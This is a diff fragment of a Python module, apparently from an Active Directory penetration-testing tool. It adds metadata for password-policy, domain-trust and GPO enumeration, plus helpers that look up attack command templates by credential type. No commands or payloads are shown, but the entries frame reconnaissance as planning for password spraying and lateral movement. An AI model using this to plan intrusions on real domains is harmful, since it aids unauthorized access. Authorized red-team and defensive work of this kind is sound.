+    },
+    # === POLICY ENUMERATION ===
+    {
+        "id": "enum-passpol",
+        "name": "Password Policy",
+        "category": "Policy Enumeration",
+        "objective": "Get password policy for spray planning",
+        "rewards": "Lockout threshold, complexity, spray parameters",
+        "requires": "Any authenticated domain user",
+        "priority": "medium",
+    },
+    {
+        "id": "enum-trusts",
+        "name": "Domain Trust Enumeration",
+        "category": "Policy Enumeration",
+        "objective": "Discover domain trusts for cross-domain attacks",
+        "rewards": "Trust relationships, potential lateral paths",
+        "requires": "Any authenticated domain user",
+        "priority": "low",
+    },
+    {
+        "id": "enum-gpos",
+        "name": "GPO Enumeration",
+        "category": "Policy Enumeration",
+        "objective": "Enumerate Group Policy Objects",
+        "rewards": "GPO misconfigs, deployed software, privilege settings",
+        "requires": "Any authenticated domain user",
+        "priority": "low",
+    },
+]
+
+
+def get_authenticated_attack_template(cred_type: str, attack_id: str) -> Optional[str]:
+    """
+    Get command template for an authenticated user attack.
+
+    Args:
+        cred_type: password, ntlm-hash, kerberos-ticket
+        attack_id: Attack ID from AUTHENTICATED_ATTACKS
+
+    Returns:
+        Command template string or None if not available
+    """
+    return AUTHENTICATED_USER_TEMPLATES.get(cred_type, {}).get(attack_id)
+
+
+def get_authenticated_attacks(priority: Optional[str] = None) -> List[Dict[str, str]]:
+    """
+    Get list of authenticated user attack metadata.
+
+    Args:
+        priority: Filter by priority (high, medium, low) or None for all
+
+    Returns:
+        List of attack metadata dicts
+    """
+    if priority is None:
+        return AUTHENTICATED_ATTACKS
+    return [a for a in AUTHENTICATED_ATTACKS if a.get("priority") == priority]
